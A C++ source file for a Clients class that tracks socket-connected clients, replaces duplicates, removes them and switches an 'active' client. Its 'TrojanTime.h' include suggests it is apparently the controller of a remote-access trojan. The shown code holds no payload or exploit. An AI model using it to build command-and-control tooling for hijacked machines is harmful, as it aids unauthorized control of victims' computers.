#include "clients.h"
#include <iostream>
#include <unistd.h>
#include <optional>
#include <functional>
#include "TrojanTime.h"

size_t Clients::GetClientCount() {
	return vecClients.size();
}

void Clients::PrintClients() {
	for (auto&& it : vecClients) {
		std::cout << it << std::endl;
		std::cout << std::endl;
	}
	PrintPrompt();
}

std::optional<int> Clients::AddClient(const Client& c_new) {
	for (auto&& c_exist : vecClients) {
		if (c_exist.GetStrID() == c_new.GetStrID()) {
			//if we already have a client with a such ID, then just replace an existing one
			int iOldFD = c_exist.GetSocketFD();
			c_exist.ReplaceSocketFD(c_new.GetSocketFD(), c_new.GetConnectionsInfo()[0].sa_in);
			std::cout << "Client replaced: " << c_exist << std::endl;
			return iOldFD;
		}
	}
	vecClients.push_back(c_new);

	if (vecClients.size() == 1)
		activeClientID = c_new.GetStrID();
	PrintInfo(CurrentTime() + " added new client: " + c_new.GetStrID());
	return std::nullopt;
}

void Clients::RemoveClientBySockFD(const int iSockFD) {
	for (std::vector<Client>::iterator it = vecClients.begin(); it != vecClients.end(); ++it) {
		if (it->GetSocketFD() == iSockFD) {
			bool bDeletedActiveClient = GetActiveClient()->get().iSockFD == iSockFD;
			std::string strRemovedClient = it->GetStrID();
			vecClients.erase(it);
			if (bDeletedActiveClient)
				activeClientID = (vecClients.size() > 0) ? (vecClients[0].GetStrID()) : ("");
			PrintInfo("removed client:" + strRemovedClient);
			return;
		}
	}
}

std::optional<std::reference_wrapper<Client>> Clients::FindClientBySockFD(const int iSockFD) {
	for (auto&& c : vecClients)
		if (c.GetSocketFD() == iSockFD)
			return std::optional<std::reference_wrapper<Client>> { c };
	return std::nullopt;
}

std::vector<Client>::iterator Clients::FindClientByID(const std::string strClientID) {
	for (std::vector<Client>::iterator it = vecClients.begin(); it != vecClients.end(); ++it) {
		if (it->GetStrID() == strClientID) {
			return it;
		}
	}
	return vecClients.end();
}

std::optional<std::reference_wrapper<Client>> Clients::GetActiveClient() {
	if (vecClients.empty())
		return std::nullopt;
	return std::optional<std::reference_wrapper<Client>> { *FindClientByID(activeClientID) };
}

void Clients::SetActiveClient(std::string strID) {
	auto c = FindClientByID(strID);
	if (c != vecClients.end()) {
		c->DumpCommunication();
		activeClientID = strID;
	} else {
		std::cout << std::string("no such client") << std::endl;
	}
	PrintPrompt();
}
